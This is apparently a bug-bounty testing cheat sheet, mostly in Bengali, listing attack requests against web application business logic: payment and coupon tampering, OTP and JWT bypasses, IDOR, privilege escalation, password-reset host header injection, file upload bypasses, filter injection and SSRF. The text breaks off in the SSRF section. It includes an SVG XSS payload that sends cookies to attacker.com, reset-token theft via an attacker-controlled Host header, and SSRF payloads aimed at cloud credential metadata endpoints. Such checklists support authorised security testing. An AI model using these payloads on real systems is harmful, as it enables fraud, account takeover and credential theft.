# 📋 TABLE OF CONTENTS

1. [Checkout & Payment (Deep Dive)](#1-checkout--payment)
2. [Authentication & Session (Deep Dive)](#2-authentication--session)
3. [Authorization & IDOR (Deep Dive)](#3-authorization--idor)
4. [Account Lifecycle (Deep Dive)](#4-account-lifecycle)
5. [Invite & Referral (Deep Dive)](#5-invite--referral)
6. [Export & Download (Deep Dive)](#6-export--download)
7. [Billing & Subscription (Deep Dive)](#7-billing--subscription)
8. [Password Reset (Deep Dive)](#8-password-reset)
9. [File Sharing & Permissions (Deep Dive)](#9-file-sharing--permissions)
10. [Search, Filter & Data Leak (Deep Dive)](#10-search-filter--data-leak)
11. [Webhook & Integrations (Deep Dive)](#11-webhook--integrations)
12. [OAuth & SSO (Deep Dive)](#12-oauth--sso)
13. [API-Specific Attacks (Deep Dive)](#13-api-specific-attacks)
14. [Race Conditions (Deep Dive)](#14-race-conditions)
15. [Multi-tenant / SaaS (Deep Dive)](#15-multi-tenant--saas)
16. [Notification & Audit Log Bypass (Deep Dive)](#16-notification--audit-log-bypass)
17. [Mobile API vs Web API (Deep Dive)](#17-mobile-api-vs-web-api)
18. [GraphQL (Deep Dive)](#18-graphql)
19. [Feature Interaction Bugs (Deep Dive)](#19-feature-interaction-bugs)
20. [Recon & Mapping Strategy (Deep Dive)](#20-recon--mapping-strategy)

---

# 1. 💳 CHECKOUT & PAYMENT

## 1.1 Price Parameter Manipulation

**Theory:** অনেক পুরনো বা তাড়াহুড়ো করে বানানো apps client থেকে আসা price trust করে।

```http
### Normal request:
POST /api/v1/checkout HTTP/1.1
Host: target.com
Authorization: Bearer USER_TOKEN
Content-Type: application/json

{
  "cart_id": "cart_abc123",
  "items": [
    {"product_id": "prod_999", "quantity": 1, "price": 49.99}
  ],
  "total": 49.99,
  "currency": "USD"
}

### Attack — price field manipulation:
{
  "cart_id": "cart_abc123",
  "items": [
    {"product_id": "prod_999", "quantity": 1, "price": 0.01}
  ],
  "total": 0.01,
  "currency": "USD"
}

### Attack — negative price:
{
  "cart_id": "cart_abc123",
  "items": [
    {"product_id": "prod_999", "quantity": 1, "price": -49.99}
  ],
  "total": -49.99
}
# Negative total → account credit পাওয়া যায়?

### Attack — zero price:
{"price": 0, "total": 0}

### Attack — null price:
{"price": null, "total": null}

### Attack — string price:
{"price": "free", "total": "free"}

### Attack — scientific notation:
{"price": 1e-10, "total": 1e-10}

### Attack — very large number (overflow):
{"price": 9999999999999999, "total": 9999999999999999}
# Integer overflow → negative number?
```

**Old program এ extra:** পুরনো programs-এ price validation server-side নাও থাকতে পারে কারণ frontend validation-এর উপর নির্ভর করত।

---

## 1.2 Quantity Manipulation

```http
POST /api/checkout HTTP/1.1

### Attack variants:
{"quantity": -1}
# Negative quantity → cart total negative → credit?

{"quantity": 0}
# Zero quantity → free item?

{"quantity": 1.5}
# Decimal → floor() হয় কিন্তু price decimal-এ charge?

{"quantity": 2147483648}
# 32-bit integer max+1 → overflow to negative

{"quantity": 0.0000001}
# Sub-zero decimal

{"quantity": "1 OR 1=1"}
# SQLi attempt in quantity

{"quantity": [1, 2, 3]}
# Array instead of integer
```

---

## 1.3 Currency & Amount Confusion

```http
### Currency swap attack:
Original: {"amount": 100, "currency": "USD"}

Attack 1: {"amount": 100, "currency": "INR"}
# $100 → ₹100 — massive difference!

Attack 2: {"amount": 100, "currency": "JPY"}
# $100 → ¥100

Attack 3: {"amount": 100, "currency": "BTC"}
# Unsupported currency → error handling? default?

Attack 4: {"amount": 100, "currency": "XXX"}
# Invalid currency → fallback?

Attack 5: {"amount": 100, "currency": "usd"}
# Lowercase → case sensitivity?

Attack 6: {"amount": 100, "currency": ""}
# Empty currency

Attack 7: {"amount": 100, "currency": null}
# Null currency

### Multi-currency confusion:
{
  "amount": 100,
  "display_currency": "USD",
  "charge_currency": "INR"
}
# display আর charge আলাদা field থাকলে?
```

---

## 1.4 Coupon & Discount Manipulation

```http
### Coupon stacking:
POST /api/apply-coupon
{"coupon": "SAVE50", "cart_id": "abc"}

# Apply করার পরে আবার apply করো:
POST /api/apply-coupon
{"coupon": "SAVE50", "cart_id": "abc"}
# Double discount?

### Discount percentage manipulation:
POST /api/checkout
{
  "coupon": "SAVE10",
  "discount_percent": 10,  ← change to 100
  "discount_amount": 5.00  ← change to 500.00
}

### Coupon for wrong product:
# Coupon শুধু Product A-এর জন্য
# কিন্তু request-এ Product B তে apply করো:
{
  "coupon": "PRODUCT_A_COUPON",
  "cart": [{"product_id": "product_b", "price": 999}]
}

### Expired coupon:
# Wayback Machine বা old JS files থেকে expired coupons খোঁজো
# Try করো — server-side expiry check আছে?

### Coupon code enumeration (old programs):
# Sequential codes: SAVE001, SAVE002, SAVE003...
# Common codes: WELCOME, NEWUSER, DISCOUNT, TEST, ADMIN

### Race condition on coupon:
# Burp Turbo Intruder দিয়ে একসাথে 20 request:
for i in range(20):
    engine.queue(target.req, gate='race1')
engine.openGate('race1')
```

---

## 1.5 Payment Flow Step Skipping

```
Normal flow:
GET  /checkout/cart          Step 1
GET  /checkout/shipping      Step 2
GET  /checkout/payment       Step 3  ← skip this
POST /checkout/confirm       Step 4

### Attack — direct Step 4:
POST /api/checkout/confirm HTTP/1.1
{
  "order_id": "order_123",
  "payment_status": "completed"  ← manually set
}

### Attack — payment status manipulation:
POST /api/payment/callback
{
  "order_id": "order_123",
  "status": "failed",    ← original
  "amount": 49.99
}
# Intercept করে:
{
  "order_id": "order_123",
  "status": "success",   ← change
  "amount": 49.99
}

### Attack — order_id prediction (old programs):
# Sequential: order_1001, order_1002
# Timestamp-based: order_1703123456
# Confirm অন্যের order?
```

---

## 1.6 Refund Logic Abuse

```http
### Refund amount manipulation:
POST /api/refund HTTP/1.1
{
  "order_id": "order_123",
  "amount": 49.99,       ← original purchase amount
  "reason": "defective"
}

# Attack:
{
  "order_id": "order_123",
  "amount": 499.99,      ← 10x amount
  "reason": "defective"
}

### Double refund (race condition):
# একই order-এ simultaneously দুটো refund request:
curl -X POST /api/refund -d '{"order_id":"123","amount":49.99}' &
curl -X POST /api/refund -d '{"order_id":"123","amount":49.99}' &

### Digital item refund loop:
1. Digital product কিনো ($50)
2. Download/access করো
3. Refund request করো
4. Refund পাও
5. Product এখনো accessible? (soft delete?)
6. আবার কিনো → আবার refund?

### Partial refund manipulation:
POST /api/refund
{
  "order_id": "order_123",
  "items": [
    {"item_id": "item_1", "refund_amount": 10.00}
  ]
}
# কিন্তু item_1 এর price ছিল $10
# total_order = $50
# Attack: refund_amount: 50.00 (full order amount for one item)
```

---

## 1.7 Gift Card & Store Credit

```http
### Gift card balance check:
GET /api/giftcard/GIFTCARD123/balance
# Response: {"balance": 50.00}

### Apply gift card:
POST /api/checkout
{"gift_card": "GIFTCARD123", "amount": 50.00}

### Attack — apply same gift card twice (race condition):
# Two simultaneous requests with same gift card

### Attack — negative gift card amount:
{"gift_card": "GIFTCARD123", "amount": -50.00}
# Credit পাওয়া যায়?

### Gift card enumeration (old programs):
# Format: GC-XXXX-XXXX-XXXX
# Brute force with Burp Intruder

### Gift card transfer to self:
# Buy gift card with credits → get credits back?
# Circular credit loop?
```

---

# 2. 🔐 AUTHENTICATION & SESSION

## 2.1 Login Response Manipulation

```http
### Normal failed login:
POST /api/login HTTP/1.1
{"email": "test@test.com", "password": "wrongpass"}

Response:
HTTP/1.1 401
{"success": false, "message": "Invalid credentials", "token": null}

### Burp Intercept — response modify:
HTTP/1.1 200  ← change status
{"success": true, "message": "Login successful", "token": "EXISTING_VALID_TOKEN"}

### 2FA bypass via response:
POST /api/login/verify-2fa
{"code": "000000"}

Response: {"verified": false, "redirect": "/2fa"}
↓ Modify:
Response: {"verified": true, "redirect": "/dashboard", "token": "..."}

### Login step skip:
# After password, before 2FA:
# Direct dashboard URL hit করো:
GET /dashboard HTTP/1.1
Cookie: session=PARTIAL_SESSION_AFTER_PASSWORD
# Partial session কি dashboard allow করে?
```

---

## 2.2 OTP Bypass Techniques

```http
### OTP in response (common in old programs):
POST /api/send-otp
{"phone": "+8801XXXXXXXXX"}

Response:
{
  "message": "OTP sent",
  "debug_otp": "123456",     ← directly exposed!
  "expires_in": 300
}

### OTP in error message:
POST /api/verify-otp
{"otp": "000000"}

Response:
{
  "error": "Invalid OTP. Correct OTP is 456789"  ← exposed!
}

### Rate limit bypass:
POST /api/verify-otp
X-Forwarded-For: 1.1.1.1
{"otp": "000001"}

POST /api/verify-otp
X-Forwarded-For: 1.1.1.2   ← different IP each time
{"otp": "000002"}

# Each unique IP = fresh rate limit

### OTP reuse:
1. OTP পাও: 123456
2. Use করো → success
3. Same OTP আবার use করো → কাজ করে?

### OTP length brute force:
# 4-digit: 10,000 combinations
# 6-digit: 1,000,000 combinations
# Rate limit না থাকলে feasible

### Response code manipulation:
POST /api/verify-otp
{"otp": "000000"}  ← wrong

Response: HTTP 400 {"verified": false}
↓ Modify response:
HTTP 200 {"verified": true, "token": "..."}

### OTP for account A, use on account B:
1. Account A-এর OTP পাও
2. Account B-এর verify endpoint-এ use করো
# Token tied to session না হলে works!
```

---

## 2.3 JWT Attacks

```bash
### JWT structure:
header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzIiwicm9sZSI6InVzZXIifQ.SIGNATURE

### Attack 1 — Algorithm None:
# Header change: {"alg": "HS256"} → {"alg": "none"}
# Signature remove করো
# Server যদি alg verify না করে — bypass!

python3 jwt_tool.py TOKEN -X a
# jwt_tool automatically করে

### Attack 2 — Weak secret brute force:
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

### Attack 3 — Algorithm confusion (RS256 → HS256):
# Public key দিয়ে HS256 sign করো
# Server যদি RS256 expect করে কিন্তু HS256 accept করে
python3 jwt_tool.py TOKEN -X k -pk public_key.pem

### Attack 4 — Payload manipulation:
# Decode payload:
echo "eyJ1c2VyX2lkIjoiMTIzIiwicm9sZSI6InVzZXIifQ" | base64 -d
{"user_id": "123", "role": "user"}

# Modify:
{"user_id": "123", "role": "admin"}
{"user_id": "1",   "role": "user"}   ← admin user?

### Attack 5 — exp manipulation:
{"user_id": "123", "exp": 9999999999}
# Far future expiry

### Attack 6 — kid injection:
# kid (key ID) header-এ path traversal:
{"kid": "../../dev/null"}
# Null key দিয়ে sign → empty secret

{"kid": "../../proc/self/fd/0"}
```

---

## 2.4 Session Fixation & Hijacking

```http
### Session fixation:
1. Login page-এ session ID পাও (before login)
   GET /login → Set-Cookie: session=FIXED_SESSION

2. Victim কে এই session দিয়ে login করাও:
   https://target.com/login?session=FIXED_SESSION

3. Login-এর পরেও same session ID রাখে?
   → তোমার কাছে victim-এর session!

### Post-login session not rotated:
Before login: session=OLD_SESSION
After login:  session=OLD_SESSION  ← same! should change

### Logout session not invalidated:
1. Login → session=ABC123
2. Note the session
3. Logout
4. Use session=ABC123 again → কাজ করে?

### Concurrent session:
1. Login on Device A → session_A
2. Login on Device B → session_B
3. Both active?
4. Password change করো → session_A still valid?

### Session cookie flags:
# Missing HttpOnly: JS দিয়ে steal করা যায়
# Missing Secure: HTTP-তে transmit হয়
# Missing SameSite: CSRF possible
# Check: document.cookie in browser console
```

---

## 2.5 Password Policy Bypass

```http
### Minimum length bypass:
POST /api/change-password
{"new_password": "a"}  ← single character

### Special character bypass:
{"new_password": "password"}  ← no special chars, passes?

### Password reuse:
{"new_password": "old_password_123"}
# Same as current password → should block

### Long password DoS:
{"new_password": "A" * 100000}
# Server hangs? bcrypt with very long string = DoS

### Unicode password tricks:
{"new_password": "pässwörd"}
# Unicode normalization issues

### Null byte injection:
{"new_password": "pass\x00word"}
# Treated as "pass" after null byte?
```

---

# 3. 🔓 AUTHORIZATION & IDOR

## 3.1 IDOR — Comprehensive Testing

```http
### Numeric ID:
GET /api/users/1001/profile     ← yours
GET /api/users/1000/profile     ← previous user
GET /api/users/1/profile        ← first user (admin?)
GET /api/users/0/profile        ← zero
GET /api/users/-1/profile       ← negative

### UUID IDOR:
# UUIDs are not always random!
GET /api/documents/550e8400-e29b-41d4-a716-446655440000

# Find other UUIDs:
# 1. Response-এ অন্য users-এর UUID leak হয়?
# 2. Error messages-এ UUID?
# 3. Email notifications-এ UUID links?
# 4. Shared content URL-এ UUID?

### Indirect IDOR — filename:
GET /api/download?file=invoice_user_1001.pdf
GET /api/download?file=invoice_user_1000.pdf

### Indirect IDOR — slug:
GET /api/profile/john-doe
GET /api/profile/admin

### Batch request IDOR:
POST /api/get-users
{"ids": ["my_id"]}

Attack:
{"ids": ["my_id", "other_user_id", "admin_id"]}
# Unauthorized IDs mixed with authorized

### IDOR in nested objects:
GET /api/teams/TEAM_ID/members/MEMBER_ID
# TEAM_ID is valid (your team)
# MEMBER_ID is from different team?

### IDOR in POST body vs URL:
GET /api/orders/ORDER_ID          ← URL-এ ID
POST /api/orders/ORDER_ID/update  ← body-তেও ID থাকলে:
{
  "order_id": "ORDER_ID",         ← this or URL takes precedence?
  "user_id": "OTHER_USER_ID"
}
```

---

## 3.2 Privilege Escalation — Vertical

```http
### Direct admin endpoint access:
GET  /api/admin/users           HTTP/1.1
GET  /api/admin/logs            HTTP/1.1
GET  /api/admin/settings        HTTP/1.1
POST /api/admin/create-user     HTTP/1.1
GET  /api/admin/export-all      HTTP/1.1
POST /api/admin/impersonate     HTTP/1.1 {"user_id": "victim"}
GET  /api/staff/tickets         HTTP/1.1
GET  /api/internal/metrics      HTTP/1.1
GET  /api/superadmin/system     HTTP/1.1

# সবগুলো normal user token দিয়ে try করো

### Role parameter injection:
POST /api/users/register HTTP/1.1
{
  "email": "test@test.com",
  "password": "pass123",
  "name": "Test User",

  # Extra fields inject করো:
  "role": "admin",
  "is_admin": true,
  "is_staff": true,
  "permissions": ["read", "write", "admin"],
  "account_type": "enterprise",
  "access_level": 99,
  "user_type": "superuser"
}

### Role upgrade via update:
PUT /api/users/MY_ID HTTP/1.1
{
  "name": "New Name",
  "role": "admin"       ← role change
}

### HTTP method escalation:
GET    /api/admin/users → 403  (blocked)
POST   /api/admin/users → 200? (different handler?)
PUT    /api/admin/users → 200?
PATCH  /api/admin/users → 200?
HEAD   /api/admin/users → 200? (reveals existence)
OPTIONS /api/admin/users → lists allowed methods
```

---

## 3.3 Horizontal Privilege Escalation

```http
### Token swap test:
# User A-এর token দিয়ে User B-এর resources:

User A token: Bearer TOKEN_A

GET /api/users/USER_B_ID/profile    Authorization: Bearer TOKEN_A
GET /api/users/USER_B_ID/orders     Authorization: Bearer TOKEN_A
GET /api/users/USER_B_ID/invoices   Authorization: Bearer TOKEN_A
PUT /api/users/USER_B_ID/email      Authorization: Bearer TOKEN_A
DELETE /api/users/USER_B_ID         Authorization: Bearer TOKEN_A

### Organization member cross-access:
# You are member of Org A
# Access Org B resources:
GET /api/orgs/ORG_B_ID/members
GET /api/orgs/ORG_B_ID/projects
GET /api/orgs/ORG_B_ID/billing

### Shared resource abuse:
# Project shared with you (read-only)
GET    /api/projects/PROJ_ID           → 200 (allowed)
PUT    /api/projects/PROJ_ID           → 200? (should be 403)
DELETE /api/projects/PROJ_ID           → 200? (should be 403)
POST   /api/projects/PROJ_ID/invite    → 200? (invite others?)
```

---

## 3.4 Object-Level vs Function-Level vs Field-Level

```http
### Object-level: can you ACCESS the object?
GET /api/documents/DOC_ID → 403? or 200?

### Function-level: can you DO things to it?
GET    /api/documents/DOC_ID → 200 (can read)
PUT    /api/documents/DOC_ID → 403 (can't write)
DELETE /api/documents/DOC_ID → 403 (can't delete)
SHARE  /api/documents/DOC_ID/share → 200?? (can share!)

### Field-level: which FIELDS can you see/modify?
GET /api/users/MY_ID
Response includes:
{
  "name": "John",
  "email": "john@test.com",
  "role": "user",           ← should you see this?
  "internal_notes": "...",  ← admin-only field?
  "salary": 50000,          ← sensitive!
  "ssn": "123-45-6789"      ← very sensitive!
}

### Field-level write:
PUT /api/users/MY_ID
{
  "name": "John Updated",
  "salary": 999999,      ← can you change this?
  "role": "admin"        ← can you change this?
}
```

---

# 4. 👤 ACCOUNT LIFECYCLE

## 4.1 Registration Bypass & Abuse

```http
### Email case confusion:
POST /api/register {"email": "admin@company.com"}    → "taken"
POST /api/register {"email": "Admin@company.com"}    → success?
POST /api/register {"email": "ADMIN@COMPANY.COM"}    → success?
POST /api/register {"email": "admin@Company.com"}    → success?

### Email alias abuse:
admin@gmail.com
a.d.m.i.n@gmail.com
admin+tag1@gmail.com
admin+tag2@gmail.com
# সবগুলো same inbox, কিন্তু different accounts!

### Unicode email tricks:
аdmin@company.com  ← Cyrillic 'а' (U+0430) not Latin 'a'
ɑdmin@company.com  ← different character

### Registration with existing email (timing):
# Email verify না করেই account create হয়?
# Verify step skip করে features access?
POST /api/register {"email": "victim@gmail.com"}
# Now you have unverified account
# Can you use it without verifying?

### Registration response leaks:
POST /api/register
Response:
{
  "user_id": "usr_123",
  "verification_token": "abc123xyz",  ← token in response!
  "message": "Verification email sent"
}
# Token directly use করো:
GET /api/verify-email?token=abc123xyz
```

---

## 4.2 Account Deletion Deep Dive

```http
### Data persistence after deletion:
POST /api/account/delete HTTP/1.1
{"confirm": true, "password": "mypassword"}

# After deletion:
GET /api/users/MY_ID → 404? or 200 (soft delete)?
GET /api/users/MY_ID/orders → accessible?
/shared-files/MY_FILE_ID → accessible?

### Re-registration after deletion:
1. Account delete করো
2. Same email দিয়ে re-register করো
3. Old data visible? Old orders? Old files?

### Deletion token reuse:
POST /api/account/delete → confirmation token পাও
Use token to delete → success
Use same token again → another account delete?

### Shared resource after deletion:
1. Team project create করো (you're owner)
2. Team members আছে
3. Your account delete করো
4. Project কার হয়? Members access করতে পারে?

### Async deletion:
1. Deletion request করো
2. Immediately অন্য actions করো:
   - API calls
   - Data export
   - Password change
3. Deletion complete হওয়ার আগে কী কী করা যায়?
```

---

## 4.3 Account Takeover via Lifecycle

```http
### Email change without verification:
POST /api/settings/change-email
{
  "new_email": "attacker@evil.com",
  "password": "current_password"
}
# Old email-এ notification যায়?
# New email verify করতে হয়?
# Verify না করেও change হয়?

### Pending email change abuse:
1. Email change request করো → pending state
2. Old email এখনো login করতে পারে?
3. New email কি আগেই কাজ করে (before verification)?
4. Pending change cancel করার আগেই new email login?

### Username change IDOR:
1. User A: username = "john"
2. User A changes username to "jane"
3. /api/users/john → কার profile?
4. Old profile URL কি accessible?
5. Shared links with old username কাজ করে?
```

---

# 5. 🎁 INVITE & REFERRAL

## 5.1 Self-Referral Comprehensive

```http
### Basic self-referral:
Account A: GET /api/referral/my-link → "REF_CODE_A"
Account B (new): POST /api/register {"ref_code": "REF_CODE_A"}
→ Account A gets credit

### Email alias self-referral:
Main: user@gmail.com → REF_CODE_A
Ref1: user+1@gmail.com with REF_CODE_A
Ref2: user+2@gmail.com with REF_CODE_A
Ref3: user.extra@gmail.com with REF_CODE_A
# All go to same inbox, unlimited credits?

### Referral credit before threshold:
# Some programs: refer 5 friends → get bonus
# Create 4 fake accounts → threshold reached → bonus
# Delete fake accounts → keep bonus?

### Referral chain:
A refers B → B gets bonus
B refers A → A gets bonus again?
→ Circular referral

### Referral code enumeration:
GET /api/referral/REF001 → valid?
GET /api/referral/REF002 → valid?
# Use admin's referral code → credit goes to admin account?
# Or can you claim it yourself?
```

---

## 5.2 Invite Link Abuse

```http
### Single-use invite used multiple times:
POST /api/invite/accept
{"token": "INVITE_TOKEN_123"}
→ Success (used once)

POST /api/invite/accept
{"token": "INVITE_TOKEN_123"}
→ Still success? (race condition or no invalidation)

### Invite role escalation:
# Normal invite URL:
/accept-invite?token=ABC&role=member

# Attack:
/accept-invite?token=ABC&role=admin
/accept-invite?token=ABC&role=owner

### Invite token for org A, use in org B:
# Accept org A invite → join org B?
POST /api/orgs/ORG_B_ID/invite/accept
{"token": "ORG_A_INVITE_TOKEN"}

### Expired invite reactivation:
POST /api/invite/resend {"email": "target@email.com"}
# New invite sent → old token still valid?

### Invite enumeration:
GET /api/invite/INV0001 → pending?
GET /api/invite/INV0002 → pending?
# Accept someone else's pending invite?
```

---

# 6. 📥 EXPORT & DOWNLOAD

## 6.1 Async Export Abuse

```http
### Export trigger:
POST /api/export HTTP/1.1
{"type": "user_data", "format": "csv"}

Response: {"job_id": "export_job_456", "status": "pending"}

### Check status:
GET /api/export/export_job_456/status
Response: {"status": "processing", "progress": 45}

### Download:
GET /api/export/export_job_456/download

### Attack — Export then downgrade:
1. POST /api/export → job_id
2. Account downgrade (premium → free)
3. GET /api/export/JOB_ID/download → premium data accessible?

### Attack — Export other user's job:
POST /api/export → your job: export_job_100
GET /api/export/export_job_099/download → previous user's export?

### Attack — Export scope injection:
POST /api/export
{
  "type": "my_data",           ← original
  "user_id": "MY_ID",

  # Inject:
  "include_all_users": true,
  "scope": "admin",
  "user_id": null,             ← remove filter
  "type": "all_users_data"
}

### Attack — format injection:
POST /api/export
{
  "format": "csv",
  "template": "../../../../etc/passwd"  ← path traversal in template
}
```

---

## 6.2 Download URL Attacks

```http
### Predictable URLs:
/downloads/2024/01/export_1234.csv
/downloads/2024/01/export_1235.csv  ← increment

/reports/user_100_report.pdf
/reports/user_101_report.pdf

### Signed URL abuse:
GET /api/download?file=report.pdf&signature=ABC123&expires=1703999999

# Attack 1: Signature bypass
GET /api/download?file=report.pdf&signature=&expires=1703999999
GET /api/download?file=report.pdf&expires=1703999999  ← no sig

# Attack 2: Expiry manipulation
GET /api/download?file=report.pdf&signature=ABC123&expires=9999999999

# Attack 3: File path traversal
GET /api/download?file=../../../etc/passwd&signature=ABC123

### Direct file access (no auth):
# Find upload directory structure from responses
# Try direct access:
GET /uploads/user_documents/confidential_report.pdf
GET /static/exports/admin_data.csv
```

---

# 7. 💰 BILLING & SUBSCRIPTION

## 7.1 Plan Limit Enforcement

```http
### Resource limit bypass:
# Plan: Free (5 projects max)
# Create 5 projects → limit reached

# Direct API call:
POST /api/projects HTTP/1.1
Authorization: Bearer FREE_USER_TOKEN
{"name": "Project 6"}
# Frontend blocks but API doesn't check? → success!

### Concurrent creation race:
# Simultaneously create multiple resources at limit:
for i in range(10):
    curl -X POST /api/projects -d '{"name": "proj"}' &

### Limit check timing:
1. At limit (5/5 projects)
2. Start creating project 6 (request in flight)
3. Delete project 1
4. Does project 6 creation succeed? (checked limit before delete)

### Old program special:
# Old programs often have limit checks only in UI
# Direct API calls bypass UI validation entirely
# Try ALL create/add endpoints directly via API
```

---

## 7.2 Subscription State Confusion

```http
### Trial → Paid → Cancel → Trial again:
1. Start free trial
2. Upgrade to paid
3. Cancel subscription
4. Try to start free trial again → blocked? or allowed?

### Downgrade feature retention:
Pro features configured:
  - Custom domain: mycustom.domain.com
  - Advanced reports: scheduled weekly
  - Team members: 50 people added
  - API rate limit: 10,000/day

Downgrade to Free:
  - Custom domain still resolves?
  - Scheduled reports still run?
  - 50 team members still active?
  - API still allows 10,000/day?
  - Direct API calls for premium features?

### Subscription grace period abuse:
# Many services have grace period after payment failure
# During grace period: full access
# Payment method: remove → grace period starts
# Abuse features during grace period
# How long is grace period? Renewable?

### Plan parameter in upgrade request:
POST /api/billing/upgrade HTTP/1.1
{
  "plan_id": "plan_pro_monthly",
  "payment_method": "pm_card_visa"
}

# Attack — intercept and change plan:
{
  "plan_id": "plan_enterprise_yearly",  ← higher tier
  "price_override": 9.99,               ← lower price
  "payment_method": "pm_card_visa"
}
```

---

# 8. 🔑 PASSWORD RESET

## 8.1 Token Vulnerability Testing

```http
### Token in response body:
POST /api/forgot-password
{"email": "user@test.com"}

Response:
{
  "message": "Reset email sent",
  "reset_url": "https://app.com/reset?token=SECRET_TOKEN"  ← exposed!
}

### Token in Referer header:
1. Reset email পাও
2. /reset?token=ABC123 page-এ যাও
3. Page-এ external resource আছে? (images, scripts, analytics)
4. External server logs-এ Referer: https://app.com/reset?token=ABC123

### Token predictability (old programs):
# Timestamp-based tokens:
token = md5(email + timestamp)
# Request করো → note time → brute force nearby timestamps

# Sequential tokens:
token = base64(user_id + sequence_number)

# Short tokens:
token = random.randint(100000, 999999)  ← 6 digit = 1M possibilities

### Multiple valid tokens:
1. Reset request করো → token_1
2. আবার request করো → token_2
3. Token_1 এখনো কাজ করে?
# Should invalidate old tokens!

### Token for account A, use on account B:
1. Account A reset request → token_A
2. Account B reset endpoint:
POST /api/reset-password
{
  "token": "TOKEN_A",
  "new_password": "hacked",
  "email": "account_b@email.com"  ← different email
}
# Token tied to account? or just valid token?
```

---

## 8.2 Host Header Injection (Detailed)

```http
### Basic host header injection:
POST /api/forgot-password HTTP/1.1
Host: attacker.com              ← change this
Content-Type: application/json

{"email": "victim@email.com"}

# Server code (vulnerable):
reset_url = f"https://{request.headers['Host']}/reset?token={token}"
# Email contains: https://attacker.com/reset?token=VICTIM_TOKEN
# Victim clicks → token goes to attacker!

### X-Forwarded-Host:
POST /api/forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com   ← some servers use this

### Forwarded header:
POST /api/forgot-password HTTP/1.1
Host: target.com
Forwarded: host=attacker.com

### Port manipulation:
Host: attacker.com:443@target.com
Host: target.com.attacker.com
Host: target.com/attacker.com

### Dangling markup:
Host: target.com"><img src="https://attacker.com/
# If reflected in email HTML → steal token via image load
```

---

# 9. 📂 FILE SHARING & PERMISSIONS

## 9.1 Permission Revocation Bypass

```http
### Share link lifecycle:
1. Share file: POST /api/files/FILE_ID/share
   Response: {"share_url": "https://app.com/s/TOKEN123"}

2. Note the direct URL

3. Revoke access: DELETE /api/files/FILE_ID/share/TOKEN123

4. Test: GET https://app.com/s/TOKEN123 → still works?

### CDN/Cache bypass after revoke:
# File served via CDN → revoke access
# CDN cache still serves file for TTL period
# Direct CDN URL works even after revoke?

### Nested permission:
Folder A (shared with you) → contains File B
Revoke folder access
Direct file URL: /api/files/FILE_B → accessible?

### Permission downgrade:
1. Share with Edit access
2. Downgrade to View access
3. Old edit API calls still work?
   PUT /api/files/FILE_ID → should be 403 now

### Time-based access bypass:
# "Link expires in 24 hours" feature
# Expiry stored client-side?
GET /api/files/FILE_ID/download?expires=1703999999
→ Change expires to 9999999999
```

---

## 9.2 File Upload Security

```http
### File type bypass:
# Only images allowed
# Upload: malicious.php renamed to image.jpg
Content-Type: image/jpeg
filename: "shell.php"
# Or:
filename: "shell.php.jpg"
filename: "shell.php%00.jpg"
filename: "shell.pHp"

### Path traversal in filename:
filename: "../../../cron.php"
filename: "....//....//etc/crontab"
filename: "%2e%2e%2f%2e%2e%2fetc%2fpasswd"

### Upload to different directory:
POST /api/upload?path=../admin/
POST /api/upload?dir=../../public/

### Overwrite existing files:
# Upload with same filename as existing important file
filename: "index.php"
filename: "config.js"
filename: ".htaccess"

### Large file DoS:
# Upload 10GB file → server storage/processing issues
# ZIP bomb: 1KB zip → 1TB when extracted

### SVG XSS:
# Upload SVG file containing XSS:
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://attacker.com/?c='+document.cookie)</script>
</svg>

### Metadata in uploads:
# Upload file with sensitive EXIF data
# Server strips EXIF? Location, device info exposed?
```

---

# 10. 🔍 SEARCH, FILTER & DATA LEAK

## 10.1 Filter Bypass Techniques

```http
### Remove filter parameters:
GET /api/invoices?user_id=MY_ID&org_id=MY_ORG
→ GET /api/invoices?user_id=MY_ID        (remove org_id)
→ GET /api/invoices?org_id=MY_ORG        (remove user_id)
→ GET /api/invoices                       (remove all filters)

### Null/empty filter:
GET /api/invoices?user_id=
GET /api/invoices?user_id=null
GET /api/invoices?user_id=undefined
GET /api/invoices?user_id[]=
GET /api/invoices?user_id=*

### Filter value manipulation:
GET /api/orders?status=mine
→ GET /api/orders?status=all
→ GET /api/orders?status=deleted
→ GET /api/orders?status=admin_only

### Array filter injection:
GET /api/users?role=user
→ GET /api/users?role[]=user&role[]=admin
→ GET /api/users?role=user,admin

### Operator injection:
GET /api/users?age=25
→ GET /api/users?age[gt]=0          (all users)
→ GET /api/users?age[$gt]=0         (MongoDB operator)
→ GET /api/users?age=25 OR 1=1      (SQL injection)

### Field selection abuse:
GET /api/users/ME?fields=name,email
→ GET /api/users/ME?fields=name,email,password_hash,ssn,salary
→ GET /api/users/ME?fields=*
→ GET /api/users/OTHER_ID?fields=name  (IDOR + field select)
```

---

## 10.2 Search Query Abuse

```http
### Search scope bypass:
# My documents search:
GET /api/search?q=confidential&scope=my_docs

# Attack — remove scope:
GET /api/search?q=confidential
GET /api/search?q=confidential&scope=all_docs
GET /api/search?q=confidential&scope=admin_docs

### Search reveals deleted data:
GET /api/search?q=deleted_project_name&include_deleted=true
GET /api/search?q=old_data&status=all

### Full-text search on sensitive fields:
GET /api/search?q=password
GET /api/search?q=secret_key
GET /api/search?q=api_key
GET /api/search?q=ssn:123
# Search index includes sensitive fields?

### Cross-user search:
# Your name is "John Test"
# Search "John Test" → only your results?
# Or other users named "John Test" also appear?

### Autocomplete data leak:
GET /api/autocomplete?q=admin@
# Returns: admin@company.com, admin@internal.com
# Exposes internal email addresses!
```

---

# 11. 🔗 WEBHOOK & INTEGRATIONS

## 11.1 SSRF via Webhook — Deep Dive

```http
### Setup webhook:
POST /api/webhooks HTTP/1.1
{
  "url": "https://your-server.com/webhook",
  "events": ["payment.success", "user.created"]
}

### SSRF payloads:
# AWS metadata:
{"url": "http://169.254.169.254/latest/meta-data/"}
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
{"url": "http://169.254.169.254/latest/user-data/"}

# GCP metadata:
{"url": "http://metadata.google.internal/computeMetadata/v1/"}
{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}

# Azure metadata:
{"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}

# Internal services:
{"url": "http://localhost:8080/admin"}
{"url": "http://127.0.0.1:9200/_cat/indices"}  ← Elasticsearch
